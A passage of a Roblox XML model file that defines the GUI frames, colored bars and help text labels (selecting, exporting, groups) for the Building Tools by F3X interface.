												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294901760</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Red</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.600000024</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX13673C7FAB3F4C1B9CD522F1886A4BDC">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4285215356</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Purple</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.800000012</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX16CE75B1495B49FB899E2CD6F15797E7">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Content</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>680</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX765A40C931D349728458B8C0ABF9491E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">1</token>
											<token name="FontSize">4</token>
											<string name="Name">ToolDescription</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0</YS>
												<YO>50</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>85</XO>
												<YS>0</YS>
												<YO>250</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">For more information on any tool, hover your mouse over its icon and it&apos;ll reveal more details.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX98C1EAF8EAFC42F88C2828F10C05C5F9">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ColorBar</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>3</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX3AC237C788994109B9AFCFE83F99A538">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294946560</Color3>
												<float name="BackgroundTransparency">0.25</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Yellow</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0.200000003</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX14940E7FFE37460E82E164D4E57774F4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4283144011</Color3>
												<float name="BackgroundTransparency">0.25</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Green</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0.200000003</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0.200000003</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX4194B76B83F9474184BEDFAC8E73AA2C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278497260</Color3>
												<float name="BackgroundTransparency">0.25</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Blue</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0.400000006</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0.200000003</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX6CE498EEE4DB4373A3B423E9ECFADFF6">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294901760</Color3>
												<float name="BackgroundTransparency">0.25</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Red</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0.600000024</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0.200000003</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX00FC4ADB53E845B9AEB510F0BAEB1E56">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4285215356</Color3>
												<float name="BackgroundTransparency">0.25</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Purple</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0.800000012</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0.200000003</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="TextLabel" referent="RBXA0A7D26F90AD466B811AB82CA921349A">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">ToolName</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0</YS>
												<YO>4</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>80</XO>
												<YS>0</YS>
												<YO>30</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">BUILDING TOOLS BY F3X</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXAEA7B5C4DD7E442CB0C16807CFD38178">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectionInfo</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX4F781FACA5FC4574A5511E2268D29133">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">TextLabel</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>15</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>82</XO>
													<YS>0</YS>
													<YO>240</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[You can select multiple parts by holding [Shift] and clicking on each part.

You can also hold [Shift], click, and drag to select parts in that area.

Press [Shift + K] to select parts inside of the selected parts.

Press [Shift + R] to clear your selectio]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX6FE17C4FDCCE4FA3B78E6FAC8751DEBE">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4282203453</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">TextLabel</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>12</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Selecting</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBXA6B390B025E046049C2EFBB868129498">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ExportingInfo</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>420</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>220</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX795253E827044BD3A18069134D049087">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">TextLabel</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>30</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>82</XO>
													<YS>0</YS>
													<YO>200</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[You can export any creations you built with Building Tools by F3X by using the export button on the dock (or pressing shift + P).

Install this plugin (mulrbx.com/item.aspx?id=142485815) in ROBLOX Studio to import your creation.]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX78E3C0881B044652AD02E25262C084B3">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4282203453</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">TextLabel</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>24</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Exporting your creations</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX4E07AF69466B4CB5B810583B8A88F70C">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">BTGroupsGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>-210</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>100</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX1A2B56938EE84EBEAFB7850EDBFA5FB9">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Templates</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>100</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX30CF2A2A45C24681BDEBF2613F69355F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282664004</Color3>
										<float name="BackgroundTransparency">0.649999976</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">GroupButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="ImageButton" referent="RBXB080D2AFEA024DB8AE10B68A061314FF">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=160400465</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0.25</float>
											<bool name="Modal">false</bool>
											<string name="Name">EditButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>1</XS>
												<XO>-50</XO>
												<YS>0</YS>
												<YO>5</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>16</XO>
												<YS>0</YS>
												<YO>16</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX021FC74D769A4B388EADC7FD78F3432C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RightTooltip</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>-50</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
